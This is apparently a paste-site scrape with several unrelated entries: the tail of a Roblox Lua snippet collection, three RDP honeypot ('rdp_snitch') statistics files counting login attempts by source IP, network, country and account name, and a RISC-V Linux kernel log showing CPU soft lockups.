    if input.KeyCode == Enum.KeyCode.E then
        -- Perform an action when the E key is pressed
        print(""E key pressed!"")
    end
end

UserInputService.InputBegan:Connect(onKeyPressed)


local TweenService = game:GetService(""TweenService"")

local partToTween = obstacleCourseModel:WaitForChild(""MovingPart"")
local startPos = partToTween.Position
local endPos = startPos + Vector3.new(0, 10, 0)
local tweenInfo = TweenInfo.new(2, Enum.EasingStyle.Linear)

-- Tween the position of a part
local tween = TweenService:Create(partToTween, tweenInfo, { Position = endPos })
tween:Play()


local HttpService = game:GetService(""HttpService"")

-- Generate a random alphanumeric string
local randomString = HttpService:GenerateGUID()
print(randomString)


local PathfindingService = game:GetService(""PathfindingService"")

local function findPath(startPos, endPos)
    -- Find a path using pathfinding
    local path = PathfindingService:CreatePath()
    path:ComputeAsync(startPos, endPos)

    local waypoints = path:GetWaypoints()
    for _, waypoint in ipairs(waypoints) do
        print(""Waypoint:"", waypoint.Position)
    end
end

findPath(Vector3.new(0, 0, 0), Vector3.new(10, 0, 10))


local Debris = game:GetService(""Debris"")

-- Create a temporary effect
local effect = Instance.new(""Part"")
effect.Size = Vector3.new(5, 5, 5)
effect.Position = Vector3.new(0, 10, 0)
effect.BrickColor = BrickColor.new(""Bright yellow"")
effect.Transparency = 0.5
effect.Anchored = true
effect.Parent = Workspace

Debris:AddItem(effect, 5) -- Destroy the effect after 5 seconds


local TweenService = game:GetService(""TweenService"")

local partToTween = obstacleCourseModel:WaitForChild(""MovingPart"")
local startPos = partToTween.Position
local endPos = startPos + Vector3.new(0, 10, 0)
local tweenInfo = TweenInfo.new(2, Enum.EasingStyle.Linear, Enum.EasingDirection.Out, -1, true, 0)

-- Create a continuous looped tween
local tween = TweenService:Create(partToTween, tweenInfo, { Position = endPos })
tween:Play()
"
skTqWYmQ,2023-07-08_stats.json,rdp_snitch,JSON,Saturday 8th of July 2023 07:17:58 PM CDT,"{
  ""ip"": {
    ""92.204.139.79"": 114,
    ""120.132.17.153"": 18,
    ""185.66.228.185"": 54,
    ""46.10.214.186"": 105,
    ""20.42.101.211"": 120,
    ""36.108.169.132"": 135,
    ""120.71.0.5"": 66,
    ""69.58.124.234"": 183,
    ""125.74.93.228"": 129,
    ""168.138.149.190"": 33,
    ""139.144.116.24"": 3,
    ""58.218.204.183"": 21,
    ""62.122.184.166"": 12,
    ""62.122.184.168"": 12,
    ""178.21.163.70"": 36,
    ""192.99.110.133"": 18,
    ""87.251.64.110"": 6,
    ""114.217.18.245"": 81,
    ""150.230.79.119"": 57,
    ""36.137.91.143"": 90,
    ""164.92.158.134"": 9,
    ""96.126.103.200"": 30,
    ""202.125.83.2"": 42,
    ""141.98.82.22"": 3,
    ""185.11.61.134"": 12,
    ""31.43.185.32"": 15,
    ""87.251.75.145"": 9,
    ""60.250.29.35"": 99,
    ""201.93.165.53"": 24,
    ""87.251.75.120"": 3,
    ""103.195.236.213"": 6,
    ""47.109.51.97"": 3,
    ""106.116.169.71"": 3,
    ""43.153.216.55"": 3,
    ""103.153.68.198"": 9,
    ""36.138.171.93"": 15,
    ""45.79.152.171"": 3,
    ""141.98.9.23"": 3,
    ""47.100.221.7"": 6,
    ""118.182.18.174"": 9,
    ""39.108.174.140"": 3,
    ""45.33.104.149"": 3,
    ""172.104.48.172"": 54,
    ""191.101.174.153"": 3,
    ""205.210.31.105"": 9,
    ""51.75.160.42"": 12,
    ""20.199.184.243"": 3,
    ""87.251.75.64"": 3,
    ""36.139.61.15"": 3,
    ""45.119.81.119"": 3,
    ""79.124.62.106"": 3,
    ""80.255.2.83"": 3,
    ""198.235.24.114"": 9,
    ""43.156.9.187"": 3,
    ""167.94.146.59"": 3
  },
  ""asn"": {
    ""AS398108"": 114,
    ""AS140292"": 18,
    ""AS201689"": 54,
    ""AS8866"": 105,
    ""AS8075"": 123,
    ""AS137695"": 201,
    ""AS32899"": 183,
    ""AS141998"": 129,
    ""AS31898"": 90,
    ""AS63949"": 93,
    ""AS4134"": 114,
    ""AS57523"": 36,
    ""AS21419"": 36,
    ""AS16276"": 30,
    ""AS48080"": 6,
    ""AS9808"": 105,
    ""AS14061"": 9,
    ""AS140443"": 42,
    ""AS209588"": 6,
    ""AS211736"": 15,
    ""AS208091"": 15,
    ""AS3462"": 99,
    ""AS27699"": 24,
    ""AS140827"": 6,
    ""AS37963"": 12,
    ""AS132203"": 6,
    ""AS131366"": 9,
    ""AS32780"": 3,
    ""AS396982"": 18,
    ""AS56041"": 3,
    ""AS131386"": 3,
    ""AS207812"": 3,
    ""AS201011"": 3,
    ""AS398705"": 3
  },
  ""isp"": {
    ""GoDaddy.com, LLC"": 114,
    ""Addresses CNNIC"": 24,
    ""Lamerd Information & Communication Technology Co., ltd"": 54,
    ""Vivacom Bulgaria EAD"": 105,
    ""Microsoft Corporation"": 123,
    ""CHINATELECOM Xinjiang Wulumuqi MAN network"": 201,
    ""Bresco Broadband"": 183,
    ""China Telecom"": 129,
    ""Oracle Corporation"": 90,
    ""Akamai Technologies, Inc."": 39,
    ""Chinanet"": 114,
    ""Chang Way Technologies Co. Limited"": 36,
    ""Pishtaze E Jadid Infomration Company"": 36,
    ""OVH SAS"": 30,
    ""Dmitriy Panchenko"": 6,
    ""China Mobile"": 105,
    ""DigitalOcean, LLC"": 9,
    ""Nawala Project - DNS Filtering Project"": 42,
    ""Flyservers S.A."": 6,
    ""FOP Dmytro Nedilskyi"": 15,
    ""XHOST-INTERNET-SOLUTIONS"": 15,
    ""Chunghwa Telecom Co., Ltd."": 99,
    ""Vivo"": 24,
    ""AZ Viet NAM Communications Technology Company Limited"": 6,
    ""Hangzhou Alibaba Advertising Co"": 6,
    ""Aceville Pte.ltd"": 3,
    ""TAM"": 9,
    ""Akamai Technologies"": 54,
    ""Hosting Services"": 3,
    ""Google LLC"": 18,
    ""China Mobile Communications Corporation"": 3,
    ""Long Van System Solution"": 3,
    ""DM AUTO EOOD"": 3,
    ""Core-Backbone GmbH"": 3,
    ""Shenzhen Tencent Computer Systems Company Limited"": 3,
    ""Censys, Inc."": 3
  },
  ""org"": {
    ""Unknown"": 270,
    ""Bulgarian Telecommunications Company Plc"": 105,
    ""Microsoft Azure Cloud (eastus)"": 120,
    ""Chinanet ZJ"": 135,
    ""Chinanet XJ"": 66,
    ""Bresco Broadband"": 183,
    ""Chinanet GS"": 138,
    ""Oracle Cloud Infrastructure (sa-saopaulo-1)"": 90,
    ""Linode"": 93,
    ""Chinanet JS"": 102,
    ""Chang Way Technologies Co. Limited"": 24,
    ""AVAST Software"": 18,
    ""Xhost Internet Solutions"": 21,
    ""China Mobile Communications Corporation"": 108,
    ""DigitalOcean, LLC"": 9,
    ""Vdsline"": 3,
    ""Starcrecium Limited"": 12,
    ""FOP Dmytro Nedilskyi"": 15,
    ""Chunghwa Telecom Co. Ltd."": 99,
    ""TELEF\ufffdNICA BRASIL S.A"": 24,
    ""DULIEUAZ"": 6,
    ""Aliyun Computing Co., LTD"": 12,
    ""Chinanet HE"": 3,
    ""TAM Media Technology Joint Stock Company"": 9,
    ""Alviva Holding Limited"": 3,
    ""Ipxo"": 3,
    ""Palo Alto Networks, Inc"": 18,
    ""OVH Ltd"": 12,
    ""Microsoft Azure Cloud (switzerlandnorth)"": 3,
    ""Internet Solutions & Innovations LTD"": 3,
    ""Wavecon GmbH"": 3,
    ""Tencent Cloud Computing"": 3,
    ""Censys, Inc."": 3
  },
  ""regionName"": {
    ""Virginia"": 234,
    ""Beijing"": 18,
    ""Tehran"": 90,
    ""Sofia-Capital"": 105,
    ""Zhejiang"": 138,
    ""Xinjiang Uyghur Autonomous Region"": 66,
    ""Ohio"": 183,
    ""Gansu"": 138,
    ""Sao Paulo"": 114,
    ""North West"": 63,
    ""Jiangsu"": 102,
    ""Moscow"": 30,
    ""Quebec"": 18,
    ""Guangdong"": 108,
    ""North Holland"": 27,
    ""California"": 51,
    ""Jakarta"": 42,
    ""Provincia de Panama"": 3,
    ""Chechnya"": 12,
    ""Kyiv City"": 15,
    ""Taipei City"": 99,
    ""Ho Chi Minh"": 9,
    ""Sichuan"": 3,
    ""Hebei"": 3,
    ""Hanoi"": 9,
    ""New Jersey"": 6,
    ""Shanghai"": 6,
    ""England"": 12,
    ""Zurich"": 3,
    ""English River"": 3,
    ""Brandenburg"": 3,
    ""Hesse"": 3
  },
  ""country"": {
    ""United States"": 474,
    ""China"": 582,
    ""Iran"": 90,
    ""Bulgaria"": 105,
    ""Brazil"": 114,
    ""Singapore"": 63,
    ""Russia"": 42,
    ""Canada"": 18,
    ""Netherlands"": 27,
    ""Indonesia"": 42,
    ""Panama"": 3,
    ""Ukraine"": 15,
    ""Taiwan"": 99,
    ""Vietnam"": 18,
    ""United Kingdom"": 12,
    ""Switzerland"": 3,
    ""Seychelles"": 3,
    ""Germany"": 6
  },
  ""account"": {
    ""142.93.8.59"": 1155,
    ""hello"": 438,
    ""Domain"": 36,
    ""Administr"": 39,
    ""Test"": 18,
    ""(empty)"": 9,
    ""beio"": 3,
    ""kKsORISJZ"": 3,
    ""rWJCPe"": 3,
    ""NGGlRp"": 3,
    ""GSbROuaox"": 3,
    ""NkmiZI"": 3,
    ""nnFabX"": 3
  },
  ""keyboard"": {
    ""Unknown"": 1716
  },
  ""client_build"": {
    ""Unknown"": 1716
  },
  ""client_name"": {
    ""Unknown"": 1716
  },
  ""ip_type"": {
    ""Unknown"": 996,
    ""mobile"": 297,
    ""hosting"": 357,
    ""proxy"": 33,
    ""hosting & proxy"": 33
  }
}"
TV88MiP0,2023-07-08_stats.json,rdp_snitch,JSON,Saturday 8th of July 2023 07:16:09 PM CDT,"{
  ""ip"": {
    ""92.204.139.79"": 76,
    ""120.132.17.153"": 12,
    ""185.66.228.185"": 36,
    ""46.10.214.186"": 70,
    ""20.42.101.211"": 80,
    ""36.108.169.132"": 90,
    ""120.71.0.5"": 44,
    ""69.58.124.234"": 122,
    ""125.74.93.228"": 86,
    ""168.138.149.190"": 22,
    ""139.144.116.24"": 2,
    ""58.218.204.183"": 14,
    ""62.122.184.166"": 8,
    ""62.122.184.168"": 8,
    ""178.21.163.70"": 24,
    ""192.99.110.133"": 12,
    ""87.251.64.110"": 4,
    ""114.217.18.245"": 54,
    ""150.230.79.119"": 38,
    ""36.137.91.143"": 60,
    ""164.92.158.134"": 6,
    ""96.126.103.200"": 20,
    ""202.125.83.2"": 28,
    ""141.98.82.22"": 2,
    ""185.11.61.134"": 8,
    ""31.43.185.32"": 10,
    ""87.251.75.145"": 6,
    ""60.250.29.35"": 66,
    ""201.93.165.53"": 16,
    ""87.251.75.120"": 2,
    ""103.195.236.213"": 4,
    ""47.109.51.97"": 2,
    ""106.116.169.71"": 2,
    ""43.153.216.55"": 2,
    ""103.153.68.198"": 6,
    ""36.138.171.93"": 10,
    ""45.79.152.171"": 2,
    ""141.98.9.23"": 2,
    ""47.100.221.7"": 4,
    ""118.182.18.174"": 6,
    ""39.108.174.140"": 2,
    ""45.33.104.149"": 2,
    ""172.104.48.172"": 36,
    ""191.101.174.153"": 2,
    ""205.210.31.105"": 6,
    ""51.75.160.42"": 8,
    ""20.199.184.243"": 2,
    ""87.251.75.64"": 2,
    ""36.139.61.15"": 2,
    ""45.119.81.119"": 2,
    ""79.124.62.106"": 2,
    ""80.255.2.83"": 2,
    ""198.235.24.114"": 6,
    ""43.156.9.187"": 2,
    ""167.94.146.59"": 2
  },
  ""asn"": {
    ""AS398108"": 76,
    ""AS140292"": 12,
    ""AS201689"": 36,
    ""AS8866"": 70,
    ""AS8075"": 82,
    ""AS137695"": 134,
    ""AS32899"": 122,
    ""AS141998"": 86,
    ""AS31898"": 60,
    ""AS63949"": 62,
    ""AS4134"": 76,
    ""AS57523"": 24,
    ""AS21419"": 24,
    ""AS16276"": 20,
    ""AS48080"": 4,
    ""AS9808"": 70,
    ""AS14061"": 6,
    ""AS140443"": 28,
    ""AS209588"": 4,
    ""AS211736"": 10,
    ""AS208091"": 10,
    ""AS3462"": 66,
    ""AS27699"": 16,
    ""AS140827"": 4,
    ""AS37963"": 8,
    ""AS132203"": 4,
    ""AS131366"": 6,
    ""AS32780"": 2,
    ""AS396982"": 12,
    ""AS56041"": 2,
    ""AS131386"": 2,
    ""AS207812"": 2,
    ""AS201011"": 2,
    ""AS398705"": 2
  },
  ""isp"": {
    ""GoDaddy.com, LLC"": 76,
    ""Addresses CNNIC"": 16,
    ""Lamerd Information & Communication Technology Co., ltd"": 36,
    ""Vivacom Bulgaria EAD"": 70,
    ""Microsoft Corporation"": 82,
    ""CHINATELECOM Xinjiang Wulumuqi MAN network"": 134,
    ""Bresco Broadband"": 122,
    ""China Telecom"": 86,
    ""Oracle Corporation"": 60,
    ""Akamai Technologies, Inc."": 26,
    ""Chinanet"": 76,
    ""Chang Way Technologies Co. Limited"": 24,
    ""Pishtaze E Jadid Infomration Company"": 24,
    ""OVH SAS"": 20,
    ""Dmitriy Panchenko"": 4,
    ""China Mobile"": 70,
    ""DigitalOcean, LLC"": 6,
    ""Nawala Project - DNS Filtering Project"": 28,
    ""Flyservers S.A."": 4,
    ""FOP Dmytro Nedilskyi"": 10,
    ""XHOST-INTERNET-SOLUTIONS"": 10,
    ""Chunghwa Telecom Co., Ltd."": 66,
    ""Vivo"": 16,
    ""AZ Viet NAM Communications Technology Company Limited"": 4,
    ""Hangzhou Alibaba Advertising Co"": 4,
    ""Aceville Pte.ltd"": 2,
    ""TAM"": 6,
    ""Akamai Technologies"": 36,
    ""Hosting Services"": 2,
    ""Google LLC"": 12,
    ""China Mobile Communications Corporation"": 2,
    ""Long Van System Solution"": 2,
    ""DM AUTO EOOD"": 2,
    ""Core-Backbone GmbH"": 2,
    ""Shenzhen Tencent Computer Systems Company Limited"": 2,
    ""Censys, Inc."": 2
  },
  ""org"": {
    ""Unknown"": 180,
    ""Bulgarian Telecommunications Company Plc"": 70,
    ""Microsoft Azure Cloud (eastus)"": 80,
    ""Chinanet ZJ"": 90,
    ""Chinanet XJ"": 44,
    ""Bresco Broadband"": 122,
    ""Chinanet GS"": 92,
    ""Oracle Cloud Infrastructure (sa-saopaulo-1)"": 60,
    ""Linode"": 62,
    ""Chinanet JS"": 68,
    ""Chang Way Technologies Co. Limited"": 16,
    ""AVAST Software"": 12,
    ""Xhost Internet Solutions"": 14,
    ""China Mobile Communications Corporation"": 72,
    ""DigitalOcean, LLC"": 6,
    ""Vdsline"": 2,
    ""Starcrecium Limited"": 8,
    ""FOP Dmytro Nedilskyi"": 10,
    ""Chunghwa Telecom Co. Ltd."": 66,
    ""TELEF\ufffdNICA BRASIL S.A"": 16,
    ""DULIEUAZ"": 4,
    ""Aliyun Computing Co., LTD"": 8,
    ""Chinanet HE"": 2,
    ""TAM Media Technology Joint Stock Company"": 6,
    ""Alviva Holding Limited"": 2,
    ""Ipxo"": 2,
    ""Palo Alto Networks, Inc"": 12,
    ""OVH Ltd"": 8,
    ""Microsoft Azure Cloud (switzerlandnorth)"": 2,
    ""Internet Solutions & Innovations LTD"": 2,
    ""Wavecon GmbH"": 2,
    ""Tencent Cloud Computing"": 2,
    ""Censys, Inc."": 2
  },
  ""regionName"": {
    ""Virginia"": 156,
    ""Beijing"": 12,
    ""Tehran"": 60,
    ""Sofia-Capital"": 70,
    ""Zhejiang"": 92,
    ""Xinjiang Uyghur Autonomous Region"": 44,
    ""Ohio"": 122,
    ""Gansu"": 92,
    ""Sao Paulo"": 76,
    ""North West"": 42,
    ""Jiangsu"": 68,
    ""Moscow"": 20,
    ""Quebec"": 12,
    ""Guangdong"": 72,
    ""North Holland"": 18,
    ""California"": 34,
    ""Jakarta"": 28,
    ""Provincia de Panama"": 2,
    ""Chechnya"": 8,
    ""Kyiv City"": 10,
    ""Taipei City"": 66,
    ""Ho Chi Minh"": 6,
    ""Sichuan"": 2,
    ""Hebei"": 2,
    ""Hanoi"": 6,
    ""New Jersey"": 4,
    ""Shanghai"": 4,
    ""England"": 8,
    ""Zurich"": 2,
    ""English River"": 2,
    ""Brandenburg"": 2,
    ""Hesse"": 2
  },
  ""country"": {
    ""United States"": 316,
    ""China"": 388,
    ""Iran"": 60,
    ""Bulgaria"": 70,
    ""Brazil"": 76,
    ""Singapore"": 42,
    ""Russia"": 28,
    ""Canada"": 12,
    ""Netherlands"": 18,
    ""Indonesia"": 28,
    ""Panama"": 2,
    ""Ukraine"": 10,
    ""Taiwan"": 66,
    ""Vietnam"": 12,
    ""United Kingdom"": 8,
    ""Switzerland"": 2,
    ""Seychelles"": 2,
    ""Germany"": 4
  },
  ""account"": {
    ""142.93.8.59"": 770,
    ""hello"": 292,
    ""Domain"": 24,
    ""Administr"": 26,
    ""Test"": 12,
    ""(empty)"": 6,
    ""beio"": 2,
    ""kKsORISJZ"": 2,
    ""rWJCPe"": 2,
    ""NGGlRp"": 2,
    ""GSbROuaox"": 2,
    ""NkmiZI"": 2,
    ""nnFabX"": 2
  },
  ""keyboard"": {
    ""Unknown"": 1144
  },
  ""client_build"": {
    ""Unknown"": 1144
  },
  ""client_name"": {
    ""Unknown"": 1144
  },
  ""ip_type"": {
    ""Unknown"": 664,
    ""mobile"": 198,
    ""hosting"": 238,
    ""proxy"": 22,
    ""hosting & proxy"": 22
  }
}"
GCZ4mWM7,2023-07-08_stats.json,rdp_snitch,JSON,Saturday 8th of July 2023 07:15:08 PM CDT,"{
  ""ip"": {
    ""92.204.139.79"": 38,
    ""120.132.17.153"": 6,
    ""185.66.228.185"": 18,
    ""46.10.214.186"": 35,
    ""20.42.101.211"": 40,
    ""36.108.169.132"": 45,
    ""120.71.0.5"": 22,
    ""69.58.124.234"": 61,
    ""125.74.93.228"": 43,
    ""168.138.149.190"": 11,
    ""139.144.116.24"": 1,
    ""58.218.204.183"": 7,
    ""62.122.184.166"": 4,
    ""62.122.184.168"": 4,
    ""178.21.163.70"": 12,
    ""192.99.110.133"": 6,
    ""87.251.64.110"": 2,
    ""114.217.18.245"": 27,
    ""150.230.79.119"": 19,
    ""36.137.91.143"": 30,
    ""164.92.158.134"": 3,
    ""96.126.103.200"": 10,
    ""202.125.83.2"": 14,
    ""141.98.82.22"": 1,
    ""185.11.61.134"": 4,
    ""31.43.185.32"": 5,
    ""87.251.75.145"": 3,
    ""60.250.29.35"": 33,
    ""201.93.165.53"": 8,
    ""87.251.75.120"": 1,
    ""103.195.236.213"": 2,
    ""47.109.51.97"": 1,
    ""106.116.169.71"": 1,
    ""43.153.216.55"": 1,
    ""103.153.68.198"": 3,
    ""36.138.171.93"": 5,
    ""45.79.152.171"": 1,
    ""141.98.9.23"": 1,
    ""47.100.221.7"": 2,
    ""118.182.18.174"": 3,
    ""39.108.174.140"": 1,
    ""45.33.104.149"": 1,
    ""172.104.48.172"": 18,
    ""191.101.174.153"": 1,
    ""205.210.31.105"": 3,
    ""51.75.160.42"": 4,
    ""20.199.184.243"": 1,
    ""87.251.75.64"": 1,
    ""36.139.61.15"": 1,
    ""45.119.81.119"": 1,
    ""79.124.62.106"": 1,
    ""80.255.2.83"": 1,
    ""198.235.24.114"": 3,
    ""43.156.9.187"": 1,
    ""167.94.146.59"": 1
  },
  ""asn"": {
    ""AS398108"": 38,
    ""AS140292"": 6,
    ""AS201689"": 18,
    ""AS8866"": 35,
    ""AS8075"": 41,
    ""AS137695"": 67,
    ""AS32899"": 61,
    ""AS141998"": 43,
    ""AS31898"": 30,
    ""AS63949"": 31,
    ""AS4134"": 38,
    ""AS57523"": 12,
    ""AS21419"": 12,
    ""AS16276"": 10,
    ""AS48080"": 2,
    ""AS9808"": 35,
    ""AS14061"": 3,
    ""AS140443"": 14,
    ""AS209588"": 2,
    ""AS211736"": 5,
    ""AS208091"": 5,
    ""AS3462"": 33,
    ""AS27699"": 8,
    ""AS140827"": 2,
    ""AS37963"": 4,
    ""AS132203"": 2,
    ""AS131366"": 3,
    ""AS32780"": 1,
    ""AS396982"": 6,
    ""AS56041"": 1,
    ""AS131386"": 1,
    ""AS207812"": 1,
    ""AS201011"": 1,
    ""AS398705"": 1
  },
  ""isp"": {
    ""GoDaddy.com, LLC"": 38,
    ""Addresses CNNIC"": 8,
    ""Lamerd Information & Communication Technology Co., ltd"": 18,
    ""Vivacom Bulgaria EAD"": 35,
    ""Microsoft Corporation"": 41,
    ""CHINATELECOM Xinjiang Wulumuqi MAN network"": 67,
    ""Bresco Broadband"": 61,
    ""China Telecom"": 43,
    ""Oracle Corporation"": 30,
    ""Akamai Technologies, Inc."": 13,
    ""Chinanet"": 38,
    ""Chang Way Technologies Co. Limited"": 12,
    ""Pishtaze E Jadid Infomration Company"": 12,
    ""OVH SAS"": 10,
    ""Dmitriy Panchenko"": 2,
    ""China Mobile"": 35,
    ""DigitalOcean, LLC"": 3,
    ""Nawala Project - DNS Filtering Project"": 14,
    ""Flyservers S.A."": 2,
    ""FOP Dmytro Nedilskyi"": 5,
    ""XHOST-INTERNET-SOLUTIONS"": 5,
    ""Chunghwa Telecom Co., Ltd."": 33,
    ""Vivo"": 8,
    ""AZ Viet NAM Communications Technology Company Limited"": 2,
    ""Hangzhou Alibaba Advertising Co"": 2,
    ""Aceville Pte.ltd"": 1,
    ""TAM"": 3,
    ""Akamai Technologies"": 18,
    ""Hosting Services"": 1,
    ""Google LLC"": 6,
    ""China Mobile Communications Corporation"": 1,
    ""Long Van System Solution"": 1,
    ""DM AUTO EOOD"": 1,
    ""Core-Backbone GmbH"": 1,
    ""Shenzhen Tencent Computer Systems Company Limited"": 1,
    ""Censys, Inc."": 1
  },
  ""org"": {
    ""Unknown"": 90,
    ""Bulgarian Telecommunications Company Plc"": 35,
    ""Microsoft Azure Cloud (eastus)"": 40,
    ""Chinanet ZJ"": 45,
    ""Chinanet XJ"": 22,
    ""Bresco Broadband"": 61,
    ""Chinanet GS"": 46,
    ""Oracle Cloud Infrastructure (sa-saopaulo-1)"": 30,
    ""Linode"": 31,
    ""Chinanet JS"": 34,
    ""Chang Way Technologies Co. Limited"": 8,
    ""AVAST Software"": 6,
    ""Xhost Internet Solutions"": 7,
    ""China Mobile Communications Corporation"": 36,
    ""DigitalOcean, LLC"": 3,
    ""Vdsline"": 1,
    ""Starcrecium Limited"": 4,
    ""FOP Dmytro Nedilskyi"": 5,
    ""Chunghwa Telecom Co. Ltd."": 33,
    ""TELEF\ufffdNICA BRASIL S.A"": 8,
    ""DULIEUAZ"": 2,
    ""Aliyun Computing Co., LTD"": 4,
    ""Chinanet HE"": 1,
    ""TAM Media Technology Joint Stock Company"": 3,
    ""Alviva Holding Limited"": 1,
    ""Ipxo"": 1,
    ""Palo Alto Networks, Inc"": 6,
    ""OVH Ltd"": 4,
    ""Microsoft Azure Cloud (switzerlandnorth)"": 1,
    ""Internet Solutions & Innovations LTD"": 1,
    ""Wavecon GmbH"": 1,
    ""Tencent Cloud Computing"": 1,
    ""Censys, Inc."": 1
  },
  ""regionName"": {
    ""Virginia"": 78,
    ""Beijing"": 6,
    ""Tehran"": 30,
    ""Sofia-Capital"": 35,
    ""Zhejiang"": 46,
    ""Xinjiang Uyghur Autonomous Region"": 22,
    ""Ohio"": 61,
    ""Gansu"": 46,
    ""Sao Paulo"": 38,
    ""North West"": 21,
    ""Jiangsu"": 34,
    ""Moscow"": 10,
    ""Quebec"": 6,
    ""Guangdong"": 36,
    ""North Holland"": 9,
    ""California"": 17,
    ""Jakarta"": 14,
    ""Provincia de Panama"": 1,
    ""Chechnya"": 4,
    ""Kyiv City"": 5,
    ""Taipei City"": 33,
    ""Ho Chi Minh"": 3,
    ""Sichuan"": 1,
    ""Hebei"": 1,
    ""Hanoi"": 3,
    ""New Jersey"": 2,
    ""Shanghai"": 2,
    ""England"": 4,
    ""Zurich"": 1,
    ""English River"": 1,
    ""Brandenburg"": 1,
    ""Hesse"": 1
  },
  ""country"": {
    ""United States"": 158,
    ""China"": 194,
    ""Iran"": 30,
    ""Bulgaria"": 35,
    ""Brazil"": 38,
    ""Singapore"": 21,
    ""Russia"": 14,
    ""Canada"": 6,
    ""Netherlands"": 9,
    ""Indonesia"": 14,
    ""Panama"": 1,
    ""Ukraine"": 5,
    ""Taiwan"": 33,
    ""Vietnam"": 6,
    ""United Kingdom"": 4,
    ""Switzerland"": 1,
    ""Seychelles"": 1,
    ""Germany"": 2
  },
  ""account"": {
    ""142.93.8.59"": 385,
    ""hello"": 146,
    ""Domain"": 12,
    ""Administr"": 13,
    ""Test"": 6,
    ""(empty)"": 3,
    ""beio"": 1,
    ""kKsORISJZ"": 1,
    ""rWJCPe"": 1,
    ""NGGlRp"": 1,
    ""GSbROuaox"": 1,
    ""NkmiZI"": 1,
    ""nnFabX"": 1
  },
  ""keyboard"": {
    ""Unknown"": 572
  },
  ""client_build"": {
    ""Unknown"": 572
  },
  ""client_name"": {
    ""Unknown"": 572
  },
  ""ip_type"": {
    ""Unknown"": 332,
    ""mobile"": 99,
    ""hosting"": 119,
    ""proxy"": 11,
    ""hosting & proxy"": 11
  }
}"
Z8bp3jNP,Untitled,Houge_Langley,Bash,Saturday 8th of July 2023 06:51:45 PM CDT,"Archlinux-MilkV-Pioneer login: [   24.431200] r8169 0003:c5:00.0 enP3p197s0: Link is Up - 1Gbps/Full - flow control off
[   24.439107] IPv6: ADDRCONF(NETDEV_CHANGE): enP3p197s0: link becomes ready
[   36.099270] systemd-journald[696]: File /var/log/journal/ed67203fb32940e6a2199d24e677ec34/user-1000.journal corrupted or uncleanly shut .
[   44.134631] FAT-fs (mmcblk1p1): Volume was not properly unmounted. Some data may be corrupt. Please run fsck.
[  327.674098] amdgpu 0001:41:00.0: [drm] *ERROR* [CRTC:53:crtc-0] flip_done timed out
[  344.282358] watchdog: BUG: soft lockup - CPU#10 stuck for 26s! [StreamTrans #4:2126]
[  344.282361] watchdog: BUG: soft lockup - CPU#5 stuck for 26s! [Timer:2090]
[  344.282362] watchdog: BUG: soft lockup - CPU#14 stuck for 26s! [StreamTrans #13:2137]
[  344.282377] Modules linked in:
[  344.282377] Modules linked in:
[  344.282382]  vfat
[  344.282385] Modules linked in:
[  344.282387]  fat
[  344.282390]  vfat fat
[  344.282395]  vfat
[  344.282399]  rfkill
[  344.282402]  rfkill
[  344.282404]  snd_hda_codec_hdmi snd_hda_intel
[  344.282408]  snd_hda_codec_hdmi snd_hda_intel snd_intel_dspcfg snd_hda_codec snd_hda_core snd_hwdep ofpart snd_pcm sophgo_spifmc spi_norc
[  344.282482] CPU: 14 PID: 2137 Comm: StreamTrans #13 Not tainted 6.1.31 #1
[  344.282490] Hardware name: Sophgo Mango (DT)
[  344.282493] epc : _raw_spin_lock+0x42/0x80
[  344.282510]  ra : __handle_mm_fault+0xe2a/0x122a
[  344.282523] epc : ffffffff80c6b8e4 ra : ffffffff801f8d42 sp : ffffffc82a5f3d50
[  344.282527]  gp : ffffffff81e76cc8 tp : ffffffd9041e9f40 t0 : ffffffe042c73000
[  344.282531]  t1 : fffffff6df89e640 t2 : 0000000000000000 s0 : ffffffc82a5f3d60
[  344.282534]  s1 : ffffffd90a4c7308 a0 : ffffffdfe1f1b1e8 a1 : 000000000010c6c7
[  344.282538]  a2 : ffffffd7fde00000 a3 : 00fffffffffff000 a4 : 000000000000039f
[  344.282541]  a5 : 0000000003a1039b a6 : 0000000000000001 a7 : 0000000000000014
[  344.282545]  s2 : ffffffd904bc5c80 s3 : ffffffe7ded39c80 s4 : 700000021139c8d7
[  344.282548]  s5 : ffffffe7ded39c80 s6 : ffffffd905395000 s7 : ffffffff8173c1f8
[  344.282552]  s8 : 0000000000000255 s9 : 0000000000000001 s10: 0000003facc614e0
[  344.282554]  s11: 0000000000000392 t3 : 7000000000000000 t4 : 0000000000000080
[  344.282558]  t5 : 0000000000000000 t6 : ffffffc82a5f3df0
[  344.282561] status: 0000000200000120 badaddr: 0000000000000000 cause: 8000000000000005
[  344.282564] [<ffffffff80c6b8e4>] _raw_spin_lock+0x42/0x80
[  344.290142]  fat rfkill
[  344.292367] watchdog: BUG: soft lockup - CPU#20 stuck for 26s! [StreamTrans #15:2139]
[  344.292384] Modules linked in: vfat fat rfkill snd_hda_codec_hdmi snd_hda_intel snd_intel_dspcfg snd_hda_codec snd_hda_core snd_hwdep ofc
[  344.292465] CPU: 20 PID: 2139 Comm: StreamTrans #15 Tainted: G             L     6.1.31 #1
[  344.292472] Hardware name: Sophgo Mango (DT)
[  344.292475] epc : _raw_spin_lock+0x42/0x80
[  344.292489]  ra : __handle_mm_fault+0xe2a/0x122a
[  344.292498] epc : ffffffff80c6b8e4 ra : ffffffff801f8d42 sp : ffffffc82a603d50
[  344.292503]  gp : ffffffff81e76cc8 tp : ffffffd9041eddc0 t0 : ffffffd92d748000
[  344.292507]  t1 : fffffff6df946500 t2 : 0000000000000100 s0 : ffffffc82a603d60
[  344.292510]  s1 : ffffffd90a4c7308 a0 : ffffffdfe1f1b1e8 a1 : 000000000010c6c7
[  344.292514]  a2 : ffffffd7fde00000 a3 : 00fffffffffff000 a4 : 000000000000039d
[  344.292517]  a5 : 0000000003a1039b a6 : 0000000000000001 a7 : 0000000000000014
[  344.292521]  s2 : ffffffd904bc5c80 s3 : ffffffdfe27e51c0 s4 : 700000004be51cd7
[  344.292524]  s5 : ffffffdfe27e51c0 s6 : ffffffd905395000 s7 : ffffffff8173c1f8
[  344.292527]  s8 : 0000000000000255 s9 : 0000000000000001 s10: 0000003facc614e0
[  344.292530]  s11: 000000000000038e t3 : 7000000000000000 t4 : 0000000000000080
[  344.292533]  t5 : 0000000000000000 t6 : ffffffc82a603df0
[  344.292536] status: 0000000200000120 badaddr: 0000000000000000 cause: 8000000000000005
[  344.292541] [<ffffffff80c6b8e4>] _raw_spin_lock+0x42/0x80
[  344.297014]  snd_intel_dspcfg snd_hda_codec
[  344.304836]  snd_hda_codec_hdmi
